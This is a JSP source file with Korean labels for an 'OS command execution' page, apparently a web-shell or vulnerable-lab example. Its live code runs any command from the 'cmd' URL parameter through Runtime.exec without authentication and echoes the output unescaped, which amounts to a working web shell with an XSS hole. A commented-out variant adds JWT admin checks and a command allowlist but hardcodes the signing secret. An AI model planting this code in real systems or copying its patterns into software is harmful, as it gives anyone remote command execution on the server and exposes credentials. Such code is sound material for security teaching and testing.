<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>명령어 실행 페이지</title>
    <link rel="stylesheet" type="text/css" href="cmd_styles.css">
</head>
<body>
<div class="container">
    <h1>운영체제 명령 실행</h1>
<%
    String cmd = request.getParameter("cmd");

    if (cmd != null && !cmd.trim().equals("")) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            InputStream inputStream = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
%>
    <h2>실행 결과:</h2>
    <div class="output">
<%
            String line;
            while ((line = reader.readLine()) != null) {
%>
        <div><%= line %></div>
<%
            }
            reader.close();
%>
    </div>
<%
        } catch (Exception e) {
%>
    <div class="alert">명령 실행 중 오류 발생: <%= e.getMessage() %></div>
<%
        }
    } else {
%>
    <form method="get">
        <label for="cmd">명령어 입력:</label><br>
        <input type="text" id="cmd" name="cmd" placeholder="예: whoami"><br>
        <button type="submit">실행</button>
    </form>
<%
    }
%>
</div>
</body>
</html>


<%-- <%@ page import="java.io.*, java.util.*, javax.crypto.spec.SecretKeySpec, java.security.Key" %>
<%@ page import="io.jsonwebtoken.*" %>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>명령 실행 (관리자 전용)</title>
    <link rel="stylesheet" type="text/css" href="cmd_styles.css">
</head>
<body>
<div class="container">
<%
    request.setCharacterEncoding("UTF-8");

    String token = null;
    String username = null;
    boolean isAuthenticated = false;

    Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if ("authToken".equals(cookie.getName())) {
                token = cookie.getValue();
                break;
            }
        }
    }

    if (token != null) {
        try {
            byte[] keyBytes = "thisIsASecretKeyThatIsAtLeast32Bytes!".getBytes("UTF-8");
            Key signingKey = new SecretKeySpec(keyBytes, SignatureAlgorithm.HS256.getJcaName());

            Claims claims = Jwts.parserBuilder()
                .setSigningKey(signingKey)
                .build()
                .parseClaimsJws(token)
                .getBody();

            username = claims.getSubject();
            isAuthenticated = true;
        } catch (Exception e) {
            out.println("<div class='alert'>인증 실패: " + e.getMessage() + "</div>");
        }
    }

    if (!isAuthenticated || !"admin".equals(username)) {
%>
    <div class="alert">관리자 인증이 필요합니다. <a href="/index.jsp">메인으로</a></div>
<%
        return;
    }

    Map<String, String> allowedCommands = new HashMap<>();
    allowedCommands.put("whoami", "whoami");
    allowedCommands.put("uptime", "uptime");
    allowedCommands.put("disk", "df -h");

    String action = request.getParameter("action");

    if (action != null && allowedCommands.containsKey(action)) {
        String command = allowedCommands.get(action);
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

        String line;
%>
    <h2>실행 결과: <code><%= command %></code></h2>
    <div class="output">
<%
        while ((line = reader.readLine()) != null) {
%>
        <div><%= line %></div>
<%
        }
        reader.close();
%>
    </div>
<%
    } else {
%>
    <h2>실행 가능한 명령어 목록</h2>
    <ul class="cmd-list">
        <li><a href="?action=whoami">whoami</a></li>
        <li><a href="?action=uptime">uptime</a></li>
        <li><a href="?action=disk">디스크 용량 확인 (df -h)</a></li>
    </ul>
<%
    }
%>
</div>
</body>
</html> --%>
